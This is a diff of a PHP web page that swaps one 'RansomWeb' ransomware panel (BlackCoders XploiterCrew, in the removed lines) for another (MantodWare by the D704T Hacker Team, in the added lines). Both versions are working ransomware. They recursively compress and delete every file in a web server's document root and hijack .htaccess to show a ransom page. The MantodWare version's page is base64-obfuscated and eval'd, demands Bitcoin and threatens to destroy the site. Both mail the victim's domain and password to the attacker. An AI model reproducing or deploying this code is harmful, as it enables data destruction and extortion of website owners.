@@ -1,198 +1,130 @@
+<!DOCTYPE html>
+<html>
+<link rel="icon" type="image/gif" href="https://i.ibb.co/mhGcf0q/D704T.jpg">
+<head>
+	<meta name="theme-color" content="#1A1C1F">
+   <title>RansomWeb</title>
+<style type="text/css">
+body {
+    background: #1A1C1F;
+    color: #e2e2e2;
+}
+.inpute{
+    border:1px solid aqua;
+    background-color: transparent;
+    color: yellow;
+    width: 200px;
+    height: 20px;
+    text-align: center;
+}
+.selecte{
+    border-style: dotted;
+    border-color: yellow;
+    background-color: transparent;
+    width: 90px;
+    color: gold;
+}
+.submite{
+       background-color: black;
+	color: cyan;
+	border: 1.2px dotten gold;
+	width: 100px;
+}
+.result{
+  text-align: left;
+}
+</style>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+</head>
+<body>
+	<center>
+<pre>
+<center><h1>
+<font color="#56F307">                                                                      
+_______ __ _____ ___ ________ ______ ___ ___ __ __ ___ _______ _______ /" \ /""\ (\" \|" \ /" ) / " \ |" \ /" ||" |/ \| "| /" "|| _ "\ |: | / \ |.\\ \ |(: \___/ // ____ \ \ \ // ||' / \: |(: ______)(. |_) :) |_____/ ) /' /\ \ |: \. \\ | \___ \ / / ) :)/\\ \/. ||: /' | \/ | |: \/ // / // __' \ |. \ \. | __/ \\(: (____/ //|: \. | \// /\' | // ___)_ (| _ \\ |: __ \ / / \\ \| \ \ | /" \ :)\ / |. \ /: | / / \\ |(: "||: |_) :) |__| \___)(___/ \___)\___|\____\)(_______/ \"_____/ |___|\__/|___||___/ \___| \_______)(_______/ 
+                                            
+                                   FuckWeb 
+                                         [ Anon Cyber Team ]                       
+<font color="white">Mail Function :</font><?php if(mail('yangrecodemudahanmati@gmail.com','mantod ganteng','mantod ganteng')) { echo "<font color='aqua'>ON</font>"; } else { echo "<font color='red'>OFF</font>"; } ?>
+</font><br></pre>
+<div class="result">
 <?php
-/*
-Created By CodeXploit|Mr.R4ND5
-Official 22XploiterCrew
-Error? Ya Maap:)
-*/
 error_reporting(0);
 set_time_limit(0);
 ini_set('memory_limit', '-1');
+if(isset($_POST['pass'])) {
+function encfile($filename){
+	if (strpos($filename, '.mantodware') !== false) {
+    return;
+	}
+	file_put_contents($filename.".mantodware", gzdeflate(file_get_contents($filename), 9));
+	unlink($filename);
+$file = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAia250bCI7DQppZihpc3NldCgkaW5wdXQpKSB7DQppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgew0KZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0KCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLm1hbnRvZHdhcmUnKSA9PT0gRkFMU0UpIHsNCglyZXR1cm47DQoJfQ0KCSRkZWNyeXB0ZWQgPSBnemluZmxhdGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVuYW1lKSk7DQoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5tYW50b2R3YXJlJywgJycsICRmaWxlbmFtZSksICRkZWNyeXB0ZWQpOw0KdW5saW5rKCdkam9hdC5waHAnKTsNCgl1bmxpbmsoJGZpbGVuYW1lKTsNCgllY2hvICc8dGl0bGU+TWFudG9kV2FyZSB8IEQ3MDRUIFJhbnNvbVdhcmU8L3RpdGxlPjxib2R5IGJnY29sb3I9IzFBMUMxRj48aSBjbGFzcz0iZmEgZmEtdW5sb2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8Zm9udCBjb2xvcj0iI0ZGRUIzQiI+VW5sb2NrPC9mb250PiAoPGZvbnQgY29sb3I9IiM0MENFMDgiPlN1Y2Nlc3M8L2ZvbnQ+KSA8Zm9udCBjb2xvcj0iIzAwRkZGRiI+PT48L2ZvbnQ+IDxmb250IGNvbG9yPSIjMjE5NkYzIj4nLiRmaWxlbmFtZS4nPC9mb250PiA8YnI+JzsNCn0NCg0KZnVuY3Rpb24gZGVjZGlyKCRkaXIpew0KCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsNCgkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOw0KCQkJfWVsc2Ugew0KCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOw0KCQl9DQoJfQ0KfQ0KDQpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7DQplY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+PGJyPkRlY3J5cHRlZDxicj4nOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5zdWNlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICc8dGl0bGU+TWFudG9kV2FyZSB8IEQ3MDRUIFJhbnNvbVdhcmU8L3RpdGxlPg0KPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNjYzEwMTciPg0KPGJvZHkgYmdjb2xvcj0jMUExQzFGPg0KPHByZT4NCjxjZW50ZXI+PGgxPg0KPGZvbnQgY29sb3I9IiM1NkYzMDciPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgX19fX19fICBfX18gICAgICAgICAgICAgX19fX18gICAgICBfX19fX19fX19fXyAgICAgICBfXyAgICAgICAgICAgICAgICAgICANCiAgX19fICAgfC8gIC9fX19fXyBfX19fX19fX18gIC9fX19fX19fX19fX18gIC9fIHwgICAgIC8gL19fX19fIF9fX19fX19fX19fXyANCiAgX18gIC98Xy8gL18gIF9fIGAvXyAgX18gXCAgX18vICBfXyBcICBfXyAgL19fIHwgL3wgLyAvXyAgX18gYC9fICBfX18vICBfIFwNCiAgXyAgLyAgLyAvIC8gL18vIC9fICAvIC8gLyAvXyAvIC9fLyAvIC9fLyAvIF9fIHwvIHwvIC8gLyAvXy8gL18gIC8gICAvICBfXy8NCiAgL18vICAvXy8gIFxfXyxfLyAvXy8gL18vXF9fLyBcX19fXy9cX18sXy8gIF9fX18vfF9fLyAgXF9fLF8vIC9fLyAgICBcX19fLyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWFudG9kV2FyZSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsgRDcwNFQgSGFja2VyIFRlYW0gXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCjwvZm9udD48YnI+DQo8aT4NCiAgICAgICAgICAgIDxmb250IGNvbG9yPSJyZWQiIHNpemU9IjIwIj5Xcm9uZyBQYXNzd29yZCAhISE8L2ZvbnQ+PC9pPg0KPC9wcmU+JzsNCn0NCmV4aXQoKTsNCn0NCj8+DQoJPCEtLS0tLS0tLS0tLS0gQ29kZWQgQnkgRDcwNFQgfCBNYW50b2RXYXJlIHwNCiBENzA0VCBIYWNrZXIgVGVhbSAtLS0tLS0tLT4gDQo8aHRtbD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+DQo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iRDcwNFQgUmFuc29td2ViIHwgTWFudG9kV2FyZSI+DQo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iTWFuVG9lZCwgUmFuc29td2FyZSwgUmFuc29td2ViLCBIYWNrZWQsIExvY2tlZCwgRW5jcnlwdGVkLCBENzA0VCI+IA0KPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJNYW50b2QiPg0KPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJpbmRleCwgYWxsIj4NCgk8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9SWNlbGFuZCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TWVyaWVuZGEnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPg0KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9U2hhZG93cytJbnRvK0xpZ2h0JyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9taEdjZjBxL0Q3MDRULmpwZyIvPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vZm9udC1hd2Vzb21lLzQuNi4zL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyI+DQo8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vaS5pYmIuY28vbWhHY2YwcS9ENzA0VC5qcGciPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9TYk40VVRRWCI+PC9zY3JpcHQ+PG1ldGEgbmFtZT0ndGhlbWUtY29sb3InIGNvbnRlbnQ9JyMwMDAwMDAnPg0KPGhlYWQ+DQo8dGl0bGU+RDcwNFQgUmFuc29tV2FyZTwvdGl0bGU+PC9oZWFkPg0KPHN0eWxlPg0KYm9keSB7DQpiYWNrZ3JvdW5kOiAjMDkxNDBFOw0KICAgYmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly9pLmliYi5jby9taEdjZjBxL0Q3MDRULmpwZyk7IGJhY2tncm91bmQtc2l6ZTpjb3Zlcjt9DQp7DQotd2Via2l0LWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KICAgLW1vei1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIC1vLWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KICAgYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQp9DQoubXR7DQogICAgYm9yZGVyOjEuMnB4IHNvbGlkIGFxdWE7DQogICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7DQogICAgY29sb3I6IGxpbWU7DQogICAgd2lkdGg6IDIwMHB4Ow0KICAgIGhlaWdodDogMjVweDsNCiAgICBmb250LWZhbWlseTogVWJ1bnR1Ow0KICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCi5idGNhZGRyZXNzew0KICAgIGJvcmRlcjowLjhweCBzb2xpZCBncmV5Ow0KICAgIGJhY2tncm91bmQtY29sb3I6ICMxQTFDMUY7DQogICAgY29sb3I6IHllbGxvdzsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgd2lkdGg6IDQwMHB4Ow0KICAgIGhlaWdodDogMjZweDsNCiAgICBmb250LXNpemU6IDE3Ow0KICAgIGZvbnQtZmFtaWx5OiBVYnVudHU7DQp9DQouZW1haWx7DQogICAgYm9yZGVyOjBweDsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7IA0KICAgIGNvbG9yOiBhcXVhOw0KICAgIHdpZHRoOiAzMTBweDsNCiAgICBoZWlnaHQ6IDMwcHg7DQogICAgZm9udC1zaXplOiAyOC41Ow0KICAgIGZvbnQtZmFtaWx5OiBJY2VsYW5kOw0KfQ0KcGxhY2Vob2xkZXJ7DQoJY29sb3I6IHllbGxvdzsNCn0NCi5nYXN7DQoJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7DQoJY29sb3I6IGdvbGQ7DQoJYm9yZGVyOiAxLjJweCBzb2xpZCBnb2xkOw0KCXdpZHRoOiA3MHB4Ow0KfQ0KPC9zdHlsZT4NCjxjZW50ZXI+PGJyPjxicj48YnI+PGJyPjxmb250Pg0KPHNwYW4gc3R5bGU9ImZvbnQ6IDQwcHggTWVyaWVuZGE7Y29sb3I6d2hpdGU7Ij5Zb3VyIFdlYnNpdGUgSGFzIGJlZW4gRW5jcnlwdA0KPGhyIHdpZHRoPSI5MCUiPjxzcGFuIHN0eWxlPSdmb250OiAxMHB4IGljZWxhbmQ7Y29sb3I6d2hpdGU7dGV4dC1zaGFkb3c6IDBweCAwcHggMXB4Oyc+fCBQYXltZW50IEFkZHJlc3MgfDxicj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImJ0Y2FkZHJlc3MiIHZhbHVlPSJwYXltZW50eiIgcmVhZG9ubHk+PGJyPg0KPHNwYW4gc3R5bGU9J2ZvbnQ6IDI1cHggaWNlbGFuZDtjb2xvcjpncmV5O3RleHQtc2hhZG93OiAwcHggMHB4IDNweDsnPk1ha2UgYSBwYXltZW50IG9yIEkgZGVzdHJveSB5b3VyIHdlYnNpdGUgYW5kIGl0IHdpbGwgbm90IHJldHVybiB0byBub3JtYWwsIGJ5IG1ha2luZyBhIHBheW1lbnQgSSB3aWxsIGdpdmUgeW91IGEgcGFzc3dvcmQgYW5kIHlvdXIgd2Vic2l0ZSB3aWxsIHJldHVybiB0byBub3JtYWwgOikNCjxicj48YnI+DQoJPHNwYW4gc3R5bGU9J2ZvbnQ6IDlweCBpY2VsYW5kO2NvbG9yOndoaXRlO3RleHQtc2hhZG93OiAwcHggMHB4IDFweDsnPnx+IFBhc3N3b3JkIH58DQo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIGNsYXNzPSJtdCIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgZGVjcnlwdGlvbiBrZXkiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImdhcyIgdmFsdWU9IkRlY3J5cHQiPg0KPC9mb3JtPg0KPGJyPjxicj4NCjxib2R5IGJnY29sb3I9YmxhY2s+PHRkIGFsaWduPWNlbnRlcj4NCjxzcGFuIHN0eWxlPSJmb250OiAxM3B4IHVidW50dTtjb2xvcjpnb2xkOyI+WyBENzA0VCBIYWNrZXIgVGVhbSBdDQo8aHIgd2lkdGg9IjcwJSIgY29sb3I9InJlZCI+DQoJPHNwYW4gc3R5bGU9J2ZvbnQ6IDguNXB4IEljZWxhbmQ7Y29sb3I6YXF1YTt0ZXh0LXNoYWRvdzogMHB4IDBweCAycHg7Jz48OjogQ29udGFjdCBNZSA6Oj4NCjxicj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImVtYWlsIiB2YWx1ZT0iZGpvYXRtYWlsIiByZWFkb25seT48YnI+DQo8bWFycXVlZSBiZWhhdmlvcj0iYWx0ZXJuYXRlIiBzY3JvbGxhbW91bnQ9IjUwIiB3aWR0aD0iNDUwIj4gPGZvbnQgc2l6ZT0iNCIgY29sb3I9InNpbHZlciI+PGI+X19fX19fX19fX19fX19fX19fX188Zm9udCBzaXplPSI0IiBjb2xvcj0icmVkIj48Yj5fX19fX19fX19fX19fX19fX19fX19fXzxmb250IHNpemU9IjQiIGNvbG9yPSJzaWx2ZXIiPjxiPl9fX19fX19fX19fX19fX19fX19fPC9mb250PjwvbWFycXVlZT48YnI+DQo8L2h0bWw+");
+$q = str_replace('kntl', md5($_POST['pass']), $file);
+$w = str_replace('djoatmail', $_POST['email'], $q);
+$e = str_replace('paymentz', $_POST['btc'], $w);
+$r = str_replace('$3', '$'.$_POST['price'], $e);
+$dec = $r;
+$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
+$cok = fopen('djoat.php', 'w');
+fwrite($cok, $comp);
+fclose($cok);
+$hta = "#MantodWare | D704T Hacker Team\n
+DirectoryIndex djoat.php\n
+ErrorDocument 403 /djoat.php\n
+ErrorDocument 404 /djoat.php\n
+ErrorDocument 500 /djoat.php\n";
+$ht = fopen('.htaccess', 'w');
+fwrite($ht, $hta);
+fclose($ht);
+echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
+}
+
+function encdir($dir){
+	$files = array_diff(scandir($dir), array('.', '..'));
+		foreach($files as $file) {
+			if(is_dir($dir."/".$file)){
+				encdir($dir."/".$file);
+			} else {
+				encfile($dir."/".$file);
+				
+		}
+	}
+}
+
+if(isset($_POST['pass'])){
+	encdir($_SERVER['DOCUMENT_ROOT']);
+}
+copy('djoat.php', $_SERVER['DOCUMENT_ROOT'].'/djoat.php');
+$memec = $_POST['email'];
+$cyna = 'MantodWare | D704T Ransomware Info';
+$ngentot = "Domain : ".$_SERVER['SERVER_NAME'];
+$skuy = "Password : ".$_POST['pass'];
+$zegarr = "$ngentot \n $skuy";
+if(mail($memec,$cyna,$zegarr)) {
+echo '<font color="lime"><b>Password Saved, Check your Email</b></font>';
+} else {
+echo '<font color="red"><b>No Mail</b></font>';
+}
+exit();
+}
 ?>
-<!doctype html>
-<html lang="en">
-  <head>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
-    <meta name="theme-color" content="#000">
-    <meta name="description" content="RansomWeb BlackCoders XploiterCrew">
-  <meta name="author" content="CodeXploit|Mr.R4ND5">
-    <!-- Bootstrap CSS -->
-    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
-    <link rel="icon" href="https://images2.imgbox.com/90/f8/AN2yEUQJ_o.jpg" type="image/jpg">
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
-    <title>RansomWeb BlackCoders XploiterCrew</title>
-    <style>
-    	body{
-    		background-color: black;
-    		color: white;
-    	}
-    	#pass{
-    		background-color: black;
-    		color: white;
-    		padding-right: 2px;
-    	}
-    	h2{
-    		font-family: "Rock Salt";
-    	}
-    	img{
-    		width: 450px;
-    		height: 10px;
-    		opacity:0.050;
-				filter:alpha(opacity=10);
-				border: 2px solid white;
-				transition: 2s;
-    	}
-    	img:hover{
-    		opacity:1;
-				filter:alpha(opacity=100);
-				width: 450px;
-    		height: 260px;
-    	}
-    </style>
-  </head>
-  <body>
-    <div class="container">
-    	<h2 class="text-center mb-3 mt-3">RansomWeb</h2>
-    	<hr>
-    	<img src="https://2.bp.blogspot.com/-FjTg4da7Ngg/W_enfrQrQzI/AAAAAAAAD9g/1NXQHWOa8XsgMZCRD7M-Ki9l4vWwRomYACLcBGAs/s640/kimi.hime___Bb_Dskthn-7___.jpg" class="mx-auto d-block">
-    	<hr>
-    	<form method="post" class="was-validated" enctype="multipart/form-data">
-    	<div class="table-bordered p-1">
-  		<div class="row">
-  			<div class="col">
-  			<input id="uploadFile" placeholder="Nama File(Index Web)" disabled="disabled" class="form-control bg-transparent text-light" id="look">
-  				</div>
-  				<div class="col">
-  		<div class="input-group">
-  <div class="custom-file">
-    <input type="file" class="custom-file-input bg-transparent" id="uploadBtn" name="upl_file">
-    <label class="custom-file-label bg-transparent" for="uploadFile"></label>
-    </div>
-  </div>
- </div>
+	<pre>
+<h2><center><font color=gold>Encryption Key [~'-']~</h2></font></pre></center>
+<form action="" method="post" style=" text-align: center;">
+<font color="aqua">
+    <label>Key : </label>
+<input type="text" name="pass" class="inpute" placeholder="make a password">
+      <select name="method" class="selecte">
+         <option value="kontolbapakkau">Encrypt</option>
+      </select><pre><br>
+<label>Your Email : </label>
+<input type="text" name="email" class="inpute">
+<label>Your Payment Address : </label>
+<input type="text" name="btc" class="inpute">
+	<br>
+      <input type="submit" name="submit" class="submite" value="Submit" />
+</form>
 </div>
-</div><hr>
-    		<div class="row">
-    			<div class="col">
-    				<input type="text" name="pass" class="form-control" id="pass" required="required" placeholder="Password" autocomplete="off">
-    			</div>
-    			<div class="col">
-    				<input type="email" name="msg" class="form-control" id="pass" required="required" autocomplete="off" placeholder="Emailmu(Bwt Send Pass)">
-    			</div>
-    		</div>
-    		<input type="submit" class="btn btn-outline-success text-light btn-block mt-2" value="Kunci">
-    	</form>
-    	<hr>
-    		<center>
-    			<small>
-    			<!-- Ganti Mandull + Maqlo Heker -->
-    				Copyright &copy; <?= date('Y'); ?> BlackCoders XploiterCrew
-    			</small>
-    		</center>
-    </div>
-    <!-- Optional JavaScript -->
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
-<script type="text/javascript">
-	document.getElementById("uploadBtn").onchange = function(){
-		document.getElementById("uploadFile").value = this.value;
-};
-</script>
-  </body>
+</body>
 </html>
-<?php
-if(isset($_POST["pass"])){
-// Kirim Password
-$untuk   = $_POST["msg"];
-$subject = "Password RansomWeb BlackCoders XploiterCrew";
-$headers = "[!] Password RansomWeb [!]";
-$website = $_SERVER["HTTP_HOST"];
-$pass    = $_POST["pass"];
-$pesan   = "Nama Domain : ".$website."\nPassword : ".$pass."\nTerkunci Pada : ".date('l, d-M-Y')."\nAkses Buka File : http://".$website."/openeds.php";
-if(!mail($untuk,$subject,$pesan,$headers)){
-	echo "<script>
-prompt('Gagal Mengunci File','Alasan => Karena Server Tidak Dapat Mengirim Email. Tar kalo lupa password lu bakal nangis');
-</script>";
-exit;
-}else{
-
-// Luncurkan Aksi
-function KunciFile($NamaFile){
-		if(strpos($NamaFile, '.xploiter') !== false){
-// Kembalikan
-			return;
-		}
-file_put_contents($NamaFile.'.xploiter',gzdeflate(file_get_contents($NamaFile), 9));
-copy('.htaccess','.htaccess(BackUp)');
-// Hapus File
-unlink($NamaFile);
-
-echo "$NamaFile => Terkunci\n";
-}
-	
-echo "<hr>
-<center>
-<p>Locked File</p>
-<small>
-Buka File => ".$_SERVER["HTTP_HOST"]."/openeds.php
-</small>
-</center>
-<textarea class='form-control text-dark' disabled rows='8'>";
-
-/* */
-function KunciDir($dir){
-		$files = array_diff(scandir($dir), array('.','..'));
-		foreach($files as $key){
-			if(is_dir($dir."/".$key)){
-				KunciDir($dir."/".$key);
-			}else{
-				KunciFile($dir."/".$key);
-			}
-		}
-	}
-if(isset($_POST["pass"])){
-		KunciDir($_SERVER["DOCUMENT_ROOT"]);
-function NamaDomain($url){
-			$x = parse_url($url);
-			$y = isset($x['host']) ? $x['host'] : '';
-			if(preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $y, $a)){
-				return $a['domain'];
-			} return FALSE;
-		}
-	}
-
-// Buat Tampilan index web
-$server_web = $_SERVER["DOCUMENT_ROOT"];
-$nama_file  = $_FILES["upl_file"]["name"];
-$tmp_upload = $server_web.'/'.$nama_file;
-@copy($_FILES["upl_file"]["tmp_name"],$tmp_upload);
-				 
-// Buat .htaccess
-$b = "#Locked\nDirectoryIndex $nama_file\nErrorDocument 404 /$nama_file";
-$a =  fopen(".htaccess","w");
-			fwrite($a,$b);
-			fclose($a);
-
-// Buat Akses Buka File [ Jangan Diganti!! ]
-$x = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCj8+DQo8IWRvY3R5cGUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCiAgPGhlYWQ+DQogICAgPCEtLSBSZXF1aXJlZCBtZXRhIHRhZ3MgLS0+DQogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MC43NSwgc2hyaW5rLXRvLWZpdD1ubyI+DQoJCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iQ29kZVhwbG9pdHxNci5SNE5ENSI+DQoJCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJVbmxvY2sgUmFuc29tV2ViIEJsYWNrQ29kZXJzIFhwbG9pdGVyQ3JldyI+DQogICAgPCEtLSBCb290c3RyYXAgQ1NTIC0tPg0KICAgIDxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9jZG4ucGl4YWJheS5jb20vcGhvdG8vMjAxMi8wNS8wNy8wMi80OS9waXJhdGUtNDc3MDVfOTYwXzcyMC5wbmciIHR5cGU9ImltYWdlL2pwZyI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIGludGVncml0eT0ic2hhMzg0LU1Ddzk4L1NGbkdFOGZKVDNHWHdFT25nc1Y3WnQyN05YRm9hb0FwbVltODFpdVhvUGtGT0p3SjhFUmRrbkxQTU8iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPg0KICAgIDx0aXRsZT5SYW5zb21XZWIgQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3PC90aXRsZT4NCiAgPC9oZWFkPg0KICA8Ym9keSBjbGFzcz0iYmctZGFyayI+DQogIAk8aDMgY2xhc3M9InRleHQtY2VudGVyIHRleHQtbGlnaHQgbXQtMyI+R2F1c2FoIFRlcmxhbHUgUmliZXQgR2F5bjwvaDM+PGhyPg0KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQogICAgCTxmb3JtIG1ldGhvZD0icG9zdCI+DQogICAgCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgY2xhc3M9ImZvcm0tY29udHJvbCBtYi0zIiBwbGFjZWhvbGRlcj0iWWFuZyBQZW50aW5nIFlha2luIj4NCiAgICAJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgYnRuLWJsb2NrIiB2YWx1ZT0iQnVrYSBGaWxlIj4NCiAgICAJPC9mb3JtPg0KICAgIAk8aHI+DQogICAgCQk8Y2VudGVyPg0KICAgIAkJCTxzbWFsbCBjbGFzcz0idGV4dC1saWdodCI+DQogICAgCQkJPCEtLSBHYW50aSBNYW5kdWxsICsgTWFxbG8gSGVrZXIgLS0+DQogICAgCQkJCUNvcHlyaWdodCAmY29weTsgPD89IGRhdGUoJ1knKTsgPz4gQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3DQogICAgCQkJPC9zbWFsbD4NCiAgICAJCTwvY2VudGVyPg0KICAgIDwvZGl2Pg0KDQogICAgPCEtLSBPcHRpb25hbCBKYXZhU2NyaXB0IC0tPg0KICAgIDwhLS0galF1ZXJ5IGZpcnN0LCB0aGVuIFBvcHBlci5qcywgdGhlbiBCb290c3RyYXAgSlMgLS0+DQogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjMuMS5zbGltLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtcThpL1grOTY1RHpPMHJUN2FiSzQxSlN0UUlBcVZnUlZ6cGJ6bzVzbVhLcDRZZlJ2SCs4YWJ0VEUxUGk2aml6byIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+DQogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3BvcHBlci5qcy8xLjE0LjMvdW1kL3BvcHBlci5taW4uanMiIGludGVncml0eT0ic2hhMzg0LVpNUDdyVm8zbUl5a1YrMis5SjNVSjQ2akJrMFdMYVVBZG42ODlhQ3dvcWJCSmlTbmpBSy9sOFd2Q1dQSVBtNDkiIGNyb3Nzb3JpZ2luPSJhb